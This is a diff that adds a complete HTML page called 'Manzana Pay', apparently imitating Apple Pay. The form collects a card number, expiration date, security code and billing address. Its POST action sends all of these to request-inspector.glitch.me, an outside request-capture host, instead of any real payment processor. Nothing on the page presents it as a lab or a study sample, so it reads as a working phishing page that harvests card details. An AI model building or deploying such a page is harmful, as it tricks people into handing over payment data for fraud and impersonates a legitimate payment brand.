@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Manzana Pay</title>
+</head>
+<body>
+    <h1>Manzana Pay</h1>
+        <p>Let your Manzana do the work! Manzana has your iBack!</p>
+    <form method="POST" action="https://request-inspector.glitch.me/">
+        <h2>Card information:</h2>
+        <label for="cc_num">Credit Card Number:</label>
+        <input type="text" name="cc_num" id="cc_num" required>
+        <br>
+        <label for="exp">Expiration Date:</label>
+        <input type="text" name="exp" id="exp" placeholder="MM/YY" required>
+        <br>
+        <label for="ccv">Security Code:</label>
+        <input type="text" name="ccv" id="ccv" placeholder="CVV" required>
+    <h2>Billing Information:</h2>
+        <label for="address">Address:</label>
+        <input type="text" name="address" id="address" placeholder="Street number and Name" required>
+        <br>
+        <label for="city">City:</label>
+        <input type="text" name="city" id="city" placeholder="City" required>
+        <br>
+        <label for="state">State:</label>
+        <input type="text" name="state" id="state" placeholder="XX" required>
+        <br>
+        <label for="zip">Zipcode</label>
+        <input type="text" name="zip" id="zip"  placeholder="5 digit zip" required>
+        <br>
+        <label for="file">Keep this card on file for future transactions?</label>
+        <input type="checkbox" name="file" id="file">
+        <br>
+        <button type="submit">Buy Now!</button>
+    </form>
+</body>
+</html>
